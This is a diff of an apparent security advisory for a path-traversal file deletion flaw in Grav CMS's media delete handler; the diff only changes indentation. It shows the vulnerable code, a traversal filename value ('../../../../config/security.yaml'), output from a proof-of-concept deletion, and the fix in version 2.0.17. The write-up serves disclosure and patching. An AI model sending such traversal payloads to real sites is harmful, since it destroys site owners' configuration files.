@@ -22,13 +22,13 @@ The media deletion flow starts in `FlexMediaTrait::deleteMediaFile()`, which rec
 // system/src/Grav/Framework/Flex/Traits/FlexMediaTrait.php:292-301
 public function deleteMediaFile(string $filename): void
 {
-    $media = $this->getMedia();
-    if (!$media instanceof MediaUploadInterface) {
-        throw new RuntimeException("Media for {$this->getFlexDirectory()->getFlexType()} doesn't support file uploads.");
-    }
+ $media = $this->getMedia();
+ if (!$media instanceof MediaUploadInterface) {
+ throw new RuntimeException("Media for {$this->getFlexDirectory()->getFlexType()} doesn't support file uploads.");
+ }
 
-    $media->deleteFile($filename);  // filename passed with no path validation
-    $this->clearMediaCache();
+ $media->deleteFile($filename); // filename passed with no path validation
+ $this->clearMediaCache();
 }
 ```
 
@@ -38,12 +38,12 @@ public function deleteMediaFile(string $filename): void
 // system/src/Grav/Framework/Flex/FlexForm.php:411-422
 public function getFileDeleteAjaxRoute($field = null, $filename = null): ?Route
 {
-    $object = $this->getObject();
-    if (!method_exists($object, 'route')) {
-        $route = Grav::instance()['route'];
-        return $route->withExtension('json')->withGravParam('task', 'media.delete');
-    }
-    return $object->route('/edit.json/task:media.delete');
+ $object = $this->getObject();
+ if (!method_exists($object, 'route')) {
+ $route = Grav::instance()['route'];
+ return $route->withExtension('json')->withGravParam('task', 'media.delete');
+ }
+ return $object->route('/edit.json/task:media.delete');
 }
 ```
 
@@ -55,23 +55,23 @@ Inside `deleteFile()`, the application validates only the basename of the filena
 // system/src/Grav/Common/Media/Traits/MediaUploadTrait.php:338-360
 public function deleteFile(string $filename, ?array $settings = null): void
 {
-    $settings = $this->getUploadSettings($settings);
-    $filesystem = Filesystem::getInstance(false);
+ $settings = $this->getUploadSettings($settings);
+ $filesystem = Filesystem::getInstance(false);
 
-    // First check for allowed filename.
-    $basename = $filesystem->basename($filename);
-    if (!Utils::checkFilename($basename)) {  // BUG: only checks basename, not pathname
-        throw new RuntimeException(...);
-    }
+ // First check for allowed filename.
+ $basename = $filesystem->basename($filename);
+ if (!Utils::checkFilename($basename)) { // BUG: only checks basename, not pathname
+ throw new RuntimeException(...);
+ }
 
-    $path = $settings['destination'] ?? $this->getPath();
-    ...
-    $pathname = $filesystem->pathname($filename);  // attacker-controlled path part
-    [$base, $ext,,] = $this->getFileParts($basename);
-    $name = "{$pathname}{$base}.{$ext}";  // reassembles with traversal path
+ $path = $settings['destination'] ?? $this->getPath();
+ ...
+ $pathname = $filesystem->pathname($filename); // attacker-controlled path part
+ [$base, $ext,,] = $this->getFileParts($basename);
+ $name = "{$pathname}{$base}.{$ext}"; // reassembles with traversal path
 
-    // Remove file and all the associated metadata.
-    $this->doRemove($name, $path);  // calls unlink("{$folder}/{$name}")
+ // Remove file and all the associated metadata.
+ $this->doRemove($name, $path); // calls unlink("{$folder}/{$name}")
 }
 ```
 
@@ -83,7 +83,7 @@ public function deleteFile(string $filename, ?array $settings = null): void
 // system/src/Grav/Common/Page/Medium/AbstractMedia.php:594-596
 protected function fileExists(string $filename, string $destination): bool
 {
-    return file_exists("{$destination}/{$filename}");
+ return file_exists("{$destination}/{$filename}");
 }
 ```
 
@@ -91,22 +91,22 @@ protected function fileExists(string $filename, string $destination): bool
 // system/src/Grav/Common/Media/Traits/MediaUploadTrait.php:530-538
 protected function doRemove(string $filename, string $path): void
 {
-    $filesystem = Filesystem::getInstance(false);
-    $locator = $this->getGrav()['locator'];
+ $filesystem = Filesystem::getInstance(false);
+ $locator = $this->getGrav()['locator'];
 
-    // If path doesn't exist, there's nothing to do.
-    $pathname = $filesystem->pathname($filename);
-    if (!$this->fileExists($pathname, $path)) {
-        return;
-    }
+ // If path doesn't exist, there's nothing to do.
+ $pathname = $filesystem->pathname($filename);
+ if (!$this->fileExists($pathname, $path)) {
+ return;
+ }
 
-    $folder = $locator->isStream($path) ? (string)$locator->findResource($path, true, true) : $path;
+ $folder = $locator->isStream($path) ? (string)$locator->findResource($path, true, true) : $path;
 
-    // Remove requested media file.
-    if ($this->fileExists($filename, $path)) {
-        $result = unlink("{$folder}/{$filename}");  // traversal sequences reach unlink()
-    }
-    ...
+ // Remove requested media file.
+ if ($this->fileExists($filename, $path)) {
+ $result = unlink("{$folder}/{$filename}"); // traversal sequences reach unlink()
+ }
+ ...
 }
 ```
 
@@ -120,8 +120,8 @@ The upload counterpart in the same class validates the complete assembled filepa
 // system/src/Grav/Common/Media/Traits/MediaUploadTrait.php:156-163
 $filepath = $folder . $filename;
 
-if (!Utils::checkFilename($filepath)) {  // validates FULL path including traversal
-    throw new RuntimeException(...);
+if (!Utils::checkFilename($filepath)) { // validates FULL path including traversal
+ throw new RuntimeException(...);
 }
 ```
 
@@ -168,11 +168,11 @@ filename=../../../../config/security.yaml
 ```
 
 3. The server processes the request through the following chain:
-   - `FlexMediaTrait::deleteMediaFile('../../../../config/security.yaml')` receives the raw filename
-   - `deleteFile()` extracts `basename()` = `security.yaml`, which passes `checkFilename()`
-   - `pathname()` = `../../../../config/` is reassembled with the basename into `$name`
-   - `doRemove()` calls `file_exists("{$folder}/../../../../config/security.yaml")` → returns `true` (file exists)
-   - `unlink("{$folder}/../../../../config/security.yaml")` executes — the file is deleted
+ - `FlexMediaTrait::deleteMediaFile('../../../../config/security.yaml')` receives the raw filename
+ - `deleteFile()` extracts `basename()` = `security.yaml`, which passes `checkFilename()`
+ - `pathname()` = `../../../../config/` is reassembled with the basename into `$name`
+ - `doRemove()` calls `file_exists("{$folder}/../../../../config/security.yaml")` → returns `true` (file exists)
+ - `unlink("{$folder}/../../../../config/security.yaml")` executes — the file is deleted
 
 4. With `$folder` resolved to e.g. `/var/www/grav/user/pages/01.blog/post-1`, the final `unlink()` path traverses to `/var/www/grav/config/security.yaml` and deletes it.
 
@@ -187,9 +187,9 @@ A simulated Grav directory structure was created:
 ```
 /tmp/audit/grav-poc/grav_root/
 ├── config/
-│   └── security.yaml          ← target file (OUTSIDE media dir)
+│ └── security.yaml ← target file (OUTSIDE media dir)
 └── user/pages/01.blog/post-1/
-    └── photo.jpg              ← legitimate media file
+ └── photo.jpg ← legitimate media file
 ```
 
 ### Execution
@@ -217,22 +217,22 @@ $ php poc.php
 
 ========================================
 [VERIFICATION]
-  Target file: .../config/security.yaml
-  File exists after attack: NO (DELETED)
-  Legitimate media file: .../photo.jpg
-  Legit file still exists: YES (untouched)
+ Target file: .../config/security.yaml
+ File exists after attack: NO (DELETED)
+ Legitimate media file: .../photo.jpg
+ Legit file still exists: YES (untouched)
 
 [+] VULNERABILITY CONFIRMED:
-    1. checkFilename() only validates basename('security.yaml') -> PASS
-    2. Pathname '../../../../' survives unchecked
-    3. Reassembled path '../../../../config/security.yaml' reaches unlink()
-    4. File outside media directory was deleted
+ 1. checkFilename() only validates basename('security.yaml') -> PASS
+ 2. Pathname '../../../../' survives unchecked
+ 3. Reassembled path '../../../../config/security.yaml' reaches unlink()
+ 4. File outside media directory was deleted
 
 [Additional] Verifying .htaccess would be blocked:
-  checkFilename('.htaccess'): FAIL (blocked)
-  checkFilename('security.yaml'): PASS
-  checkFilename('index.php'): FAIL (blocked by dangerous extension)
-  checkFilename('index.html'): PASS
+ checkFilename('.htaccess'): FAIL (blocked)
+ checkFilename('security.yaml'): PASS
+ checkFilename('index.php'): FAIL (blocked by dangerous extension)
+ checkFilename('index.html'): PASS
 ```
 
 The target file `config/security.yaml` was successfully deleted while the legitimate media file `photo.jpg` was untouched. The `fileExists()` check in `doRemove()` did not prevent the traversal because it is a plain `file_exists()` that resolves `../` sequences natively.
@@ -266,10 +266,10 @@ The fix in 2.0.17 adds a new `checkFilepath()` method that rejects paths contain
 // system/src/Grav/Common/Media/Traits/MediaUploadTrait.php:438-444 (fixed in 2.0.17)
 protected function checkFilepath(string $filename): bool
 {
-    return $filename !== ''
-        && strpbrk($filename, "\\\0") === false
-        && !str_starts_with($filename, '/')
-        && !in_array('..', explode('/', $filename), true);
+ return $filename !== ''
+ && strpbrk($filename, "\\\0") === false
+ && !str_starts_with($filename, '/')
+ && !in_array('..', explode('/', $filename), true);
 }
 ```
 
@@ -284,7 +284,7 @@ For environments that cannot upgrade immediately, apply the fix manually in `del
 ```php
 // Before the basename check, add full-path validation:
 if (strpos($filename, '..') !== false || strpos($filename, '/') === 0) {
-    throw new RuntimeException("Invalid file path", 400);
+ throw new RuntimeException("Invalid file path", 400);
 }
 ```
 
